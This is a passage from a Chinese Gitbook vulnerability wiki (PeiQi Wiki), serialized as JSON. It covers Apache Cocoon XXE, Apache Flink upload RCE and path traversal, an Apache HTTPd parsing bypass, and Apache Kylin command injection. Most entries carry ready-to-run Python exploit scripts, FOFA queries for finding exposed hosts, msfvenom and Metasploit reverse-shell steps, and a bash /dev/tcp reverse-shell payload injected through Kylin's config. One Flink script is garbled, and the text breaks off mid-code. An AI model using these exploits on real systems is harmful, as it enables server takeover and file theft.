CVE-2020-11991.html":{"url":"PeiQi_Wiki/Web服务器漏洞/Apache/Apache Cocoon/Apache Cocoon XML注入 CVE-2020-11991.html","title":"Apache Cocoon XML注入 CVE-2020-11991","keywords":"","body":"Apache Cocoon XML注入 CVE-2020-11991 漏洞描述 9月11日 Apache 软件基金会发布安全公告，修复了 Apache Cocoon xml外部实体注入漏洞（CVE-2020-11991）。 Apache Cocoon 是一个基于 Spring 框架的围绕分离理念建立的构架，在这种框架下的所有处理都被预先定义好的处理组件线性连接起来，能够将输入和产生的输出按照流水线顺序处理。用户群：Apache Lenya、Daisy CMS、Hippo CMS、Mindquarry等等，Apache Cocoon 通常被作为一个数据抽取、转换、加载工具或者是系统之间传输数据的中转站。CVE-2020-11991 与 StreamGenerator 有关，在使用 StreamGenerator 时，代码将解析用户提供的 xml。攻击者可以使用包括外部系统实体在内的特制 xml 来访问服务器系统上的任何文件。 影响版本 [!NOTE] Apache Cocoon FOFA [!NOTE] app=\"Apache-Cocoon\" 漏洞复现 向/v2/api/product/manger/getInfo POST如下内容 ]> John &ent; 漏洞利用POC #!/usr/bin/python3 #-*- coding:utf-8 -*- # author : PeiQi # from : http://wiki.peiqi.tech import requests import base64 import sys def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mVersion: Apache Cocoon >> http://xxx.xxx.xxx.xxx \\033[0m') print('+------------------------------------------') def POC_1(target_url): vuln_url = target_url + \"/v2/api/product/manger/getInfo\" data = \"\"\" ]> John &ent; \"\"\" headers = { \"User-Agent\": \"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", } response = requests.request(\"POST\", url=vuln_url, data=data, headers=headers, timeout=20) if \"/bin/bash\" in response.text: print(\"\\033[32m[o] 含有CVE-2020-11991漏洞，响应为{}\\033[0m\".format(response.text)) else: print(\"\\033[31m[x] 漏洞利用失败 \\033[0m\") if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) POC_1(target_url) PeiQi WiKi文库 all right reserved，powered by Gitbook文件更新时间： 2021-01-16 04:33:19 "},"PeiQi_Wiki/Web服务器漏洞/Apache/Apache Flink/":{"url":"PeiQi_Wiki/Web服务器漏洞/Apache/Apache Flink/","title":"Apache Flink","keywords":"","body":"Apache Flink Apache Flink Apache Flink 目录遍历漏洞 CVE-2020-17519 PeiQi WiKi文库 all right reserved，powered by Gitbook文件更新时间： 2021-01-16 04:33:19 "},"PeiQi_Wiki/Web服务器漏洞/Apache/Apache Flink/Apache Flink 小于1.9.1远程代码执行 CVE-2020-17518.html":{"url":"PeiQi_Wiki/Web服务器漏洞/Apache/Apache Flink/Apache Flink 小于1.9.1远程代码执行 CVE-2020-17518.html","title":"Apache Flink 小于1.9.1远程代码执行 CVE-2020-17518","keywords":"","body":"Apache Flink 漏洞描述 近日,有安全研究员公开了一个Apache Flink的任意Jar包上传导致远程代码执行的漏洞. 漏洞影响 [!NOTE] Apache Flink FOFA FOFA 语句 app=\"Apache-Flink\" && country=\"CN\" 国内还是很多使用 Apache Flink 的，大概有1000的数量左右 漏洞复现 打开一个使用 Apache Flink 的网站，打开后页面为这样子 点击查看文件上传页面 打开MSF 生成一个 jar 木马 msfvenom -p java/meterpreter/reverse_tcp LHOST=xxx.xxx.xxx.xxx LPORT=4444 -f jar > test.jar 点击 Add 上传 jar 文件 监听端口 msf6 > use exploit/multi/handler [*] Using configured payload generic/shell_reverse_tcp msf6 exploit(multi/handler) > set payload java/shell/reverse_tcp payload => java/shell/reverse_tcp msf6 exploit(multi/handler) > set lhost xxx.xxx.xxx.xxx lhost => xxx.xxx.xxx.xxx msf6 exploit(multi/handler) > set lport 4444 lport => 4444 msf6 exploit(multi/handler) > run 点击下 submit 反弹回来一个root 权限shell 漏洞检测POC import requests def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mVersion: Apache Flink >> http://xxx.xxx.xxx.xxx:9999 \\033[0m') print('+------------------------------------------') def POC_1(target_url): vuln_url = target_url + \"/jars/upload\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" } try: response = requests.get(url=vuln_url, headers=headers, timeout=20) if \"Unable to load requested file /jars/upload.\" in response.text: print(\"\\033[32m[o] 可能存在 Apache Flink >> \\033[0m\")) POC_1(target_url) PeiQi WiKi文库 all right reserved，powered by Gitbook文件更新时间： 2021-01-16 04:33:19 "},"PeiQi_Wiki/Web服务器漏洞/Apache/Apache Flink/Apache Flink 目录遍历漏洞 CVE-2020-17519.html":{"url":"PeiQi_Wiki/Web服务器漏洞/Apache/Apache Flink/Apache Flink 目录遍历漏洞 CVE-2020-17519.html","title":"Apache Flink 目录遍历漏洞 CVE-2020-17519","keywords":"","body":"Apache Flink 目录遍历漏洞 CVE-2020-17519 漏洞描述 2021年01月06日，360CERT监测发现Apache Flink发布了Apache Flink 目录穿越漏洞,目录穿越漏洞的风险通告，漏洞编号为CVE-2020-17518,CVE-2020-17519，漏洞等级：高危，漏洞评分：8.5。 远程攻击者通过REST API目录遍历，可造成文件读取/写入的影响。 漏洞影响 [!NOTE] Apache Flink 1.11.0 Apache Flink 1.11.1 Apache Flink 1.11.2 FOFA [!NOTE] app=\"Apache Flink\" 环境搭建 https://github.com/vulhub/vulhub/tree/master/flink/CVE-2020-17519 漏洞复现 POC: http://xxx.xxx.xxx.xxx/jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd 漏洞利用POC import requests import sys import json from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mVersion: Apache Flink 1.11.0-1.11.2 \\033[0m') print('+ \\033[36m使用格式: python3 CVE-2020-17519.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx \\033[0m') print('+ \\033[36mFile >>> /etc/passwd \\033[0m') print('+------------------------------------------') def POC_1(target_url, file_name): file_name = file_name.replace(\"/\", \"%252f\") vuln_url = target_url + \"/jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..{}\".format(file_name) headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", } try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.get(url=vuln_url, timeout=10, verify=False, headers=headers) print(\"\\033[32m[o] 请求URL ： {}\\033[0m\".format(vuln_url)) if \"root\" in response.text: print(\"\\033[32m[o] 目标 {} 存在漏洞,成功读取 /etc/passwd ，响应为:\\n{}\\033[0m\".format(target_url, response.text)) else : print(\"\\033[31m[x] 目标Url漏洞利用失败\\033[0m\") sys.exit(0) except Exception as e: print(\"\\033[31m[x] 目标Url漏洞利用失败\\033[0m\") sys.exit(0) def POC_2(target_url, file_name): file_name_re = file_name.replace(\"/\", \"%252f\") vuln_url = target_url + \"/jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..{}\".format(file_name_re) headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", } try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.get(url=vuln_url, timeout=10, verify=False, headers=headers) print(\"\\033[32m[o] 请求URL ： {}\\033[0m\".format(vuln_url)) if \"error\" not in response.text: print(\"\\033[32m[o] 目标 {} 存在漏洞,成功读取 {} ，响应为:\\n{}\\033[0m\".format(target_url, file_name, response.text)) else : print(\"\\033[31m[x] 目标文件{}读取失败\\033[0m\".format(file_name)) except Exception as e: print(\"\\033[31m[x] 目标Url漏洞利用失败\\033[0m\") sys.exit(0) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) file_name = \"/etc/passwd\" POC_1(target_url, file_name) while True: file_name = input(\"\\033[35mFile >>> \\033[0m\") if file_name == \"exit\": sys.exit(0) else: POC_2(target_url, file_name) PeiQi WiKi文库 all right reserved，powered by Gitbook文件更新时间： 2021-01-16 04:33:19 "},"PeiQi_Wiki/Web服务器漏洞/Apache/Apache HTTPd/":{"url":"PeiQi_Wiki/Web服务器漏洞/Apache/Apache HTTPd/","title":"Apache HTT Pd","keywords":"","body":"Apache HTTPd Apache HTTPd 换行解析漏洞 CVE-2017-15715 PeiQi WiKi文库 all right reserved，powered by Gitbook文件更新时间： 2021-01-16 04:33:19 "},"PeiQi_Wiki/Web服务器漏洞/Apache/Apache HTTPd/Apache HTTPd 换行解析漏洞 CVE-2017-15715.html":{"url":"PeiQi_Wiki/Web服务器漏洞/Apache/Apache HTTPd/Apache HTTPd 换行解析漏洞 CVE-2017-15715.html","title":"Apache HTTPd 换行解析漏洞 CVE-2017-15715","keywords":"","body":"Apache HTTPd 换行解析漏洞 CVE-2017-15715 漏洞描述 Apache HTTPD是一款HTTP服务器，它可以通过mod_php来运行PHP网页。其2.4.0~2.4.29版本中存在一个解析漏洞，在解析PHP时，1.php\\x0A将被按照PHP后缀进行解析，导致绕过一些服务器的安全策略。 漏洞影响 [!NOTE] Apache HTTPd 2.4.0~2.4.29版本 环境搭建 https://github.com/vulhub/vulhub.git cd vulhub/httpd/CVE-2017-15715 docker-compose up -d 访问 http://xxx.xxx.xxx.xxx:8080 正常即可 漏洞复现 直接上传恶意文件会被拦截 抓包修改如下参数 响应为200，成功绕过 访问 http://xxx.xxx.xxx.xxx:8080/evil.php%0a 成功触发解析漏洞 PeiQi WiKi文库 all right reserved，powered by Gitbook文件更新时间： 2021-01-16 04:33:19 "},"PeiQi_Wiki/Web服务器漏洞/Apache/Apache Kylin/":{"url":"PeiQi_Wiki/Web服务器漏洞/Apache/Apache Kylin/","title":"Apache Kylin","keywords":"","body":"Apache Kylin Apache-kylin 未授权配置泄露 CVE-2020-13937 Apache Kylin 命令注入漏洞 CVE-2020-1956 Apache Kylin 命令注入漏洞 CVE-2020-13925 PeiQi WiKi文库 all right reserved，powered by Gitbook文件更新时间： 2021-01-16 04:33:19 "},"PeiQi_Wiki/Web服务器漏洞/Apache/Apache Kylin/Apache Kylin 命令注入漏洞 CVE-2020-13925.html":{"url":"PeiQi_Wiki/Web服务器漏洞/Apache/Apache Kylin/Apache Kylin 命令注入漏洞 CVE-2020-13925.html","title":"Apache Kylin 命令注入漏洞 CVE-2020-13925","keywords":"","body":"Apache Kylin 命令注入漏洞 CVE-2020-13925 漏洞描述 6月，京东安全的蓝军团队发现了一个 apache kylin 远程命令执行严重漏洞（ CVE-2020-13925）。黑客可以利用这个漏洞，登录任何管理员账号和密码默认未修改的账号，获得管理员权限。由于Apache Kylin被广泛应用于企业的大数据分析平台，因此该漏洞将对企业核心数据具有较大的危害，存在数据泄露风险，建议用户尽快升级软件至安全版本。 影响版本 [!NOTE] Apache Kylin 2.3.0 ~ 2.3.2 Apache Kylin 2.4.0 ~ 2.4.1 Apache Kylin 2.5.0 ~ 2.5.2 Apache Kylin 2.6.0 ~ 2.6.5 Apache Kylin 3.0.0-alpha, Apache Kylin 3.0.0-alpha2, Apache Kylin 3.0.0-beta, Apache Kylin 3.0.0, Kylin 3.0.1,Kylin 3.0.2 环境搭建 这里使用 docker 来搭建需要的环境 Kylin官方文档 docker pull apachekylin/apache-kylin-standalone:3.0.1 [!NOTE] 如果服务器内存较小，可不选择 -m 8G 参数 docker run -d \\ -m 8G \\ -p 7070:7070 \\ -p 8088:8088 \\ -p 50070:50070 \\ -p 8032:8032 \\ -p 8042:8042 \\ -p 16010:16010 \\ apachekylin/apache-kylin-standalone:3.0.1 打开后使用默认账号密码admin/KYLIN登录，出现初始界面即为成功 漏洞复现 出现漏洞的代码文件在server-base/src/main/java/org/apache/kylin/rest/controller/DiagnosisController.java /** * Get diagnosis information for project */ @RequestMapping(value = \"/project/{project}/download\", method = { RequestMethod.GET }, produces = { \"application/json\" }) @ResponseBody public void dumpProjectDiagnosisInfo(@PathVariable String project, final HttpServletRequest request, final HttpServletResponse response) { try (AutoDeleteDirectory diagDir = new AutoDeleteDirectory(\"diag_project\", \"\")) { String filePath = dgService.dumpProjectDiagnosisInfo(project, diagDir.getFile()); setDownloadResponse(filePath, response); } catch (IOException e) { throw new InternalErrorException(\"Failed to dump project diagnosis info. \" + e.getMessage(), e); } } 这里可以看到 {project}参数是用户可控的变量，向下跟进dumpProjectDiagnosisInfo函数 public String dumpProjectDiagnosisInfo(String project, File exportPath) throws IOException { aclEvaluate.checkProjectOperationPermission(project); String[] args = { project, exportPath.getAbsolutePath() }; runDiagnosisCLI(args); return getDiagnosisPackageName(exportPath); } 首先通过checkProjectOperationPermission函数来检查该project是否许可，然后构建一个args的字符串数组，看一下checkProjectOperationPermission函数 public void checkProjectOperationPermission(String projectName) { ProjectInstance projectInstance = getProjectInstance(projectName); aclUtil.hasProjectOperationPermission(projectInstance); } 这里传入projectName，然后通过getProjectInstance来获取项目实例,跟进getProjectInstance private ProjectInstance getProjectInstance(String projectName) { return ProjectManager.getInstance(KylinConfig.getInstanceFromEnv()).getProject(projectName); } 因为 projectName 会被我们替换掉，所以不会获得一个正确的projectName,则会返回一个Null，查看下hasProjectOperationPermission函数 @PreAuthorize(Constant.ACCESS_HAS_ROLE_ADMIN + \" or hasPermission(#project, 'ADMINISTRATION')\" + \" or hasPermission(#project, 'MANAGEMENT')\" + \" or hasPermission(#project, 'OPERATION')\") public boolean hasProjectOperationPermission(ProjectInstance project) { return true; } 这里并没有对projectName进行检验，只对用户身份进行了检验，当为ADMIN、ADMINISTRATION、MANAGEMENT、OPERATION等权限，该值默认返回为true，回到 dumpProjectDiagnosisInfo函数，向下继续跟进runDiagnosisCLI函数 private void runDiagnosisCLI(String[] args) throws IOException { Message msg = MsgPicker.getMsg(); File cwd = new File(\"\"); logger.debug(\"Current path: \" + cwd.getAbsolutePath()); logger.debug(\"DiagnosisInfoCLI args: \" + Arrays.toString(args)); File script = new File(KylinConfig.getKylinHome() + File.separator + \"bin\", \"diag.sh\"); if (!script.exists()) { throw new BadRequestException( String.format(Locale.ROOT, msg.getDIAG_NOT_FOUND(), script.getAbsolutePath())); } String diagCmd = script.getAbsolutePath() + \" \" + StringUtils.join(args, \" \"); CliCommandExecutor executor = KylinConfig.getInstanceFromEnv().getCliCommandExecutor(); Pair cmdOutput = executor.execute(diagCmd); if (cmdOutput.getFirst() != 0) { throw new BadRequestException(msg.getGENERATE_DIAG_PACKAGE_FAIL()); } } 注意看这几行代码 String diagCmd = script.getAbsolutePath() + \" \" + StringUtils.join(args, \" \"); CliCommandExecutor executor = KylinConfig.getInstanceFromEnv().getCliCommandExecutor(); Pair cmdOutput = executor.execute(diagCmd); 与 Apache Kylin 命令注入漏洞 CVE-2020-1956 类似，同样也是经过execute函数，而digCmd同样也是经过了命令拼接 private Pair runRemoteCommand(String command, Logger logAppender) throws IOException { SSHClient ssh = new SSHClient(remoteHost, port, remoteUser, remotePwd); SSHClientOutput sshOutput; try { sshOutput = ssh.execCommand(command, remoteTimeoutSeconds, logAppender); int exitCode = sshOutput.getExitCode(); String output = sshOutput.getText(); return Pair.newPair(exitCode, output); } catch (IOException e) { throw e; } catch (Exception e) { throw new IOException(e.getMessage(), e); } } private Pair runNativeCommand(String command, Logger logAppender) throws IOException { String[] cmd = new String[3]; String osName = System.getProperty(\"os.name\"); if (osName.startsWith(\"Windows\")) { cmd[0] = \"cmd.exe\"; cmd[1] = \"/C\"; } else { cmd[0] = \"/bin/bash\"; cmd[1] = \"-c\"; } cmd[2] = command; ProcessBuilder builder = new ProcessBuilder(cmd); builder.redirectErrorStream(true); Process proc = builder.start(); BufferedReader reader = new BufferedReader( new InputStreamReader(proc.getInputStream(), StandardCharsets.UTF_8)); String line; StringBuilder result = new StringBuilder(); while ((line = reader.readLine()) != null && !Thread.currentThread().isInterrupted()) { result.append(line).append('\\n'); if (logAppender != null) { logAppender.log(line); } } if (Thread.interrupted()) { logger.info(\"CliCommandExecutor is interruppted by other, kill the sub process: \" + command); proc.destroy(); try { Thread.sleep(1000); } catch (InterruptedException e) { // do nothing } return Pair.newPair(1, \"Killed\"); } try { int exitCode = proc.waitFor(); return Pair.newPair(exitCode, result.toString()); } catch (InterruptedException e) { Thread.currentThread().interrupt(); throw new IOException(e); } } } 这样我们就可以通过控制 {project} 请求就可以造成命令注入 /kylin/api/diag/project/{project}/download /kylin/api/diag/project/||ping `whoami.111.111.111`||/download 拼接后则出现 /home/admin/apache-kylin-3.0.1-bin-hbase1x/bin/diag.sh {project} {diagDir} 这里通过报错语句可以回显命令验证漏洞存在 throw new InternalErrorException(\"Failed to dump project diagnosis info. \" + e.getMessage(), e); 在修复中，过滤了||,&&等符号，造成无法命令注入 漏洞通报中共两个利用点 /kylin/api/diag/project/{project}/download /kylin/api/diag/job/{jobId}/download 查看函数发现利用方式相同，直接利用job会失败，因为 {project}默认有一个learn_kylin，而job没有 漏洞利用POC #!/usr/bin/python3 #-*- coding:utf-8 -*- # author : PeiQi # from : http://wiki.peiqi.tech import requests import base64 import sys import re def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mVersion: Apache Kylin >> http://xxx.xxx.xxx.xxx:7070 \\033[0m') print('+ \\033[36mLogin >>> admin:KYLIN(格式为User:Pass) \\033[0m') print('+------------------------------------------') def POC_1(target_url): login_url = target_url + \"/kylin/api/user/authentication\" user_pass = str(input(\"\\033[35mPlease input User and Pass\\nLogin >>> \\033[0m\")) Authorization = \"Basic \" + str((base64.b64encode(user_pass.encode('utf-8'))),'utf-8') headers = { \"User-Agent\": \"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Authorization\": Authorization, \"Cookie\": \"project=null\" } try: response = requests.post(url=login_url, headers=headers, timeout=20) if \"password\" not in response.text: print(\"\\033[31m[x] 账号密码出现错误 \\033[0m\") sys.exit(0) else: print(\"\\033[32m[o] 成功登录，获得JSESSIONID：\" + response.cookies[\"JSESSIONID\"] + \"\\033[0m\") return response.cookies[\"JSESSIONID\"] except: print(\"\\033[31m[x] 漏洞利用失败\\033[0m\") sys.exit(0) def POC_2(target_url, cookie): vuln_url = target_url + '/kylin/api/diag/project/%7C%7Cping%20%60whoami%60.111.111.111%7C%7C/download' headers = { \"User-Agent\": \"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Cookie\": \"project=null;JSESSIONID=\" + cookie } try: response = requests.get(url=vuln_url, headers=headers, timeout=20) if \".111.111.111||\" in response.text: whoami = re.findall(r'ping: (.*?).111.111.111: 未知的名称或服务',response.text)[0] print(\"\\033[32m[o] 存在漏洞，成功执行whoami，响应为{}\\033[0m\".format(whoami)) else: print(\"\\033[31m[x] 漏洞利用失败,||,&&等符号已被过滤，无法造成命令注入\\033[0m\") except: print(\"\\033[31m[x] 请求超时\\033[0m\") if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) try: cookie = POC_1(target_url) except: print(\"\\033[31m[x] 漏洞利用失败 \\033[0m\") sys.exit(0) POC_2(target_url, cookie) PeiQi WiKi文库 all right reserved，powered by Gitbook文件更新时间： 2021-01-16 04:33:19 "},"PeiQi_Wiki/Web服务器漏洞/Apache/Apache Kylin/Apache Kylin 命令注入漏洞 CVE-2020-1956.html":{"url":"PeiQi_Wiki/Web服务器漏洞/Apache/Apache Kylin/Apache Kylin 命令注入漏洞 CVE-2020-1956.html","title":"Apache Kylin 命令注入漏洞 CVE-2020-1956","keywords":"","body":"Apache Kylin 命令注入漏洞 CVE-2020-1956 漏洞描述 2020年5月22日，CNVD 通报了 Apache Kylin 存在命令注入漏洞 CVE-2020-1956，地址在 http://www.cnnvd.org.cn/web/xxk/ldxqById.tag?CNNVD=CNNVD-202005-1133 。 Apache Kylin 是美国 Apache 软件基金会的一款开源的分布式分析型数据仓库。该产品主要提供 Hadoop/Spark 之上的 SQL 查询接口及多维分析（OLAP**）等功能。 影响版本 [!NOTE] Apache Kylin 2.3.0 ~ 2.3.2 Apache Kylin 2.4.0 ~ 2.4.1 Apache Kylin 2.5.0 ~ 2.5.2 Apache Kylin 2.6.0 ~ 2.6.5 Apache Kylin 3.0.0-alpha, Apache Kylin 3.0.0-alpha2, Apache Kylin 3.0.0-beta, Apache Kylin 3.0.0, Kylin 3.0.1 环境搭建 这里使用 docker 来搭建需要的环境 Kylin官方文档 docker pull apachekylin/apache-kylin-standalone:3.0.1 [!NOTE] 如果服务器内存较小，可不选择 -m 8G 参数 docker run -d \\ -m 8G \\ -p 7070:7070 \\ -p 8088:8088 \\ -p 50070:50070 \\ -p 8032:8032 \\ -p 8042:8042 \\ -p 16010:16010 \\ apachekylin/apache-kylin-standalone:3.0.1 打开后使用默认账号密码admin/KYLIN登录，出现初始界面即为成功 漏洞分析 查看这个漏洞修复的补丁 查看地址 这里可以看到此漏洞有关的参数有三个，分别是 srcCfgUri、dstCfgUri、projectName，相关的函数为 migrateCube 官方文档中对 migrateCube 的描述 POST /kylin/api/cubes/{cube}/{project}/migrate 下载 Apache Kylin 3.0.1 的源代码进行代码审计,出现漏洞函数的文件为以下路径 apache-kylin-3.0.1\\server-base\\src\\main\\java\\org\\apache\\kylin\\rest\\service\\CubeService.java 找到migrateCube函数 @PreAuthorize(Constant.ACCESS_HAS_ROLE_ADMIN + \" or hasPermission(#cube, 'ADMINISTRATION') or hasPermission(#cube, 'MANAGEMENT')\") public void migrateCube(CubeInstance cube, String projectName) { KylinConfig config = cube.getConfig(); if (!config.isAllowAutoMigrateCube()) { throw new InternalErrorException(\"One click migration is disabled, please contact your ADMIN\"); } for (CubeSegment segment : cube.getSegments()) { if (segment.getStatus() != SegmentStatusEnum.READY) { throw new InternalErrorException( \"At least one segment is not in READY state. Please check whether there are Running or Error jobs.\"); } } String srcCfgUri = config.getAutoMigrateCubeSrcConfig(); String dstCfgUri = config.getAutoMigrateCubeDestConfig(); Preconditions.checkArgument(StringUtils.isNotEmpty(srcCfgUri), \"Source configuration should not be empty.\"); Preconditions.checkArgument(StringUtils.isNotEmpty(dstCfgUri), \"Destination configuration should not be empty.\"); String stringBuilderstringBuilder = (\"%s/bin/kylin.sh org.apache.kylin.tool.CubeMigrationCLI %s %s %s %s %s %s true true\"); String cmd = String.format(Locale.ROOT, stringBuilder, KylinConfig.getKylinHome(), srcCfgUri, dstCfgUri, cube.getName(), projectName, config.isAutoMigrateCubeCopyAcl(), config.isAutoMigrateCubePurge()); logger.info(\"One click migration cmd: \" + cmd); CliCommandExecutor exec = new CliCommandExecutor(); PatternedLogger patternedLogger = new PatternedLogger(logger); try { exec.execute(cmd, patternedLogger); } catch (IOException e) { throw new InternalErrorException(\"Failed to perform one-click migrating\", e); } } PreAuthorize里面定义了路由权限，ADMIN权限、ADMINISTRATION权限和MANAGEMENT权限可以访问该service。 @PreAuthorize(Constant.ACCESS_HAS_ROLE_ADMIN + \" or hasPermission(#cube, 'ADMINISTRATION') or hasPermission(#cube, 'MANAGEMENT')\") 在1087行判断是否开启了MigrateCube设置，如果没有开启则会报错 跟进 isAllowAutoMigrateCube() 这个函数 可以看到这里默认的配置kylin.tool.auto-migrate-cube.enabled 就是Flase public boolean isAllowAutoMigrateCube() { return Boolean.parseBoolean(getOptional(\"kylin.tool.auto-migrate-cube.enabled\", FALSE)); } 在没有开启配置kylin.tool.auto-migrate-cube.enabled为true的情况下，调用MigrateCube则会出现报错 通过Apache Kylin的SYSTEM模块开启kylin.tool.auto-migrate-cube.enabled为True 设置后再去请求则不会出现刚刚的报错，而是出现Source configuration should not be empty 跟进出现报错语句的代码块 String srcCfgUri = config.getAutoMigrateCubeSrcConfig(); String dstCfgUri = config.getAutoMigrateCubeDestConfig(); Preconditions.checkArgument(StringUtils.isNotEmpty(srcCfgUri), \"Source configuration should not be empty.\"); Preconditions.checkArgument(StringUtils.isNotEmpty(dstCfgUri), \"Destination configuration should not be empty.\"); 这里进行了对kylin.tool.auto-migrate-cube.src-config和kylin.tool.auto-migrate-cube.dest-config的配置进行了检测 ,如果为空则会出现刚刚的报错 跟进 getAutoMigrateCubeSrcConfig()和getAutoMigrateCubeDestConfig()函数 public String getAutoMigrateCubeSrcConfig() { return getOptional(\"kylin.tool.auto-migrate-cube.src-config\", \"\"); } public String getAutoMigrateCubeDestConfig() { return getOptional(\"kylin.tool.auto-migrate-cube.dest-config\", \"\"); } 发现这两个配置默认为空，因为配置允许自定义，所以srcCfgUri和dstCfgUri两个变量均是可控的 继续向下走，发现一处命令拼接 String stringBuilder = (\"%s/bin/kylin.sh org.apache.kylin.tool.CubeMigrationCLI %s %s %s %s %s %s true true\"); String cmd = String.format(Locale.ROOT, stringBuilder, KylinConfig.getKylinHome(), srcCfgUri, dstCfgUri, cube.getName(), projectName, config.isAutoMigrateCubeCopyAcl(), config.isAutoMigrateCubePurge()); logger.info(\"One click migration cmd: \" + cmd); CliCommandExecutor exec = new CliCommandExecutor(); PatternedLogger patternedLogger = new PatternedLogger(logger); try { exec.execute(cmd, patternedLogger); } catch (IOException e) { throw new InternalErrorException(\"Failed to perform one-click migrating\", e); } } 进入到execute函数 private Pair runRemoteCommand(String command, Logger logAppender) throws IOException { SSHClient ssh = new SSHClient(remoteHost, port, remoteUser, remotePwd); SSHClientOutput sshOutput; try { sshOutput = ssh.execCommand(command, remoteTimeoutSeconds, logAppender); int exitCode = sshOutput.getExitCode(); String output = sshOutput.getText(); return Pair.newPair(exitCode, output); } catch (IOException e) { throw e; } catch (Exception e) { throw new IOException(e.getMessage(), e); } } private Pair runNativeCommand(String command, Logger logAppender) throws IOException { String[] cmd = new String[3]; String osName = System.getProperty(\"os.name\"); if (osName.startsWith(\"Windows\")) { cmd[0] = \"cmd.exe\"; cmd[1] = \"/C\"; } else { cmd[0] = \"/bin/bash\"; cmd[1] = \"-c\"; } cmd[2] = command; ProcessBuilder builder = new ProcessBuilder(cmd); builder.redirectErrorStream(true); Process proc = builder.start(); BufferedReader reader = new BufferedReader( new InputStreamReader(proc.getInputStream(), StandardCharsets.UTF_8)); String line; StringBuilder result = new StringBuilder(); while ((line = reader.readLine()) != null && !Thread.currentThread().isInterrupted()) { result.append(line).append('\\n'); if (logAppender != null) { logAppender.log(line); } } if (Thread.interrupted()) { logger.info(\"CliCommandExecutor is interruppted by other, kill the sub process: \" + command); proc.destroy(); try { Thread.sleep(1000); } catch (InterruptedException e) { // do nothing } return Pair.newPair(1, \"Killed\"); } try { int exitCode = proc.waitFor(); return Pair.newPair(exitCode, result.toString()); } catch (InterruptedException e) { Thread.currentThread().interrupt(); throw new IOException(e); } } } 由此可以得出我们可以通过这两个可控的参数，执行任意我们需要的命令，例如反弹一个shell，设置的配置为 [!NOTE] kylin.tool.auto-migrate-cube.enabled=true kylin.tool.auto-migrate-cube.src-config=echo;bash -i >& /dev/tcp/xxx.xxx.xxx.xxx/9999 0>&1 kylin.tool.auto-migrate-cube.dest-config=shell 再去发送POST请求 /kylin/api/cubes/kylin_sales_cube/learn_kylin/migrate 成功反弹一个shell 漏洞利用POC [!NOTE] POC利用前提是拥有账号密码，默认账号密码是 admin/KYLIN #!/usr/bin/python3 #-*- coding:utf-8 -*- # author : PeiQi # from : http://wiki.peiqi.tech import requests import base64 import sys def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mVersion: Apache Kylin >> http://xxx.xxx.xxx.xxx:7070 \\033[0m') print('+ \\033[36mLogin >>> admin:KYLIN(格式为User:Pass) \\033[0m') print('+------------------------------------------') def POC_1(target_url): login_url = target_url + \"/kylin/api/user/authentication\" user_pass = str(input(\"\\033[35mPlease input User and Pass\\nLogin >>> \\033[0m\")) Authorization = \"Basic \" + str((base64.b64encode(user_pass.encode('utf-8'))),'utf-8') headers = { \"User-Agent\": \"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Authorization\": Authorization, \"Cookie\": \"project=null\" } try: response = requests.post(url=login_url, headers=headers, timeout=20) if \"password\" not in response.text: print(\"\\033[31m[x] 账号密码出现错误 \\033[0m\") sys.exit(0) else: print(\"\\033[32m[o] 成功登录，获得JSESSIONID：\" + response.cookies[\"JSESSIONID\"] + \"\\033[0m\") return response.cookies[\"JSESSIONID\"],Authorization except: print(\"\\033[31m[x] 漏洞利用失败\\033[0m\") sys.exit(0) def POC_2(target_url, cookie, IP, PORT, Authorization): config_url = target_url + \"/kylin/api/admin/config\" key = [\"kylin.tool.auto-migrate-cube.enabled\",\"kylin.tool.auto-migrate-cube.src-config\",\"kylin.tool.auto-migrate-cube.dest-config\"] value = [\"true\",\"echo;bash -i >& /dev/tcp/{}/{} 0>&1;echo\".format(IP, PORT), \"shell\"] headers = { \"User-Agent\": \"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Authorization\": Authorization, \"Accept\": \"application/json, text/plain, */*\", \"Content-Type\": \"application/json;charset=UTF-8\", \"Pragma\": \"no-cache\", \"Cookie\": 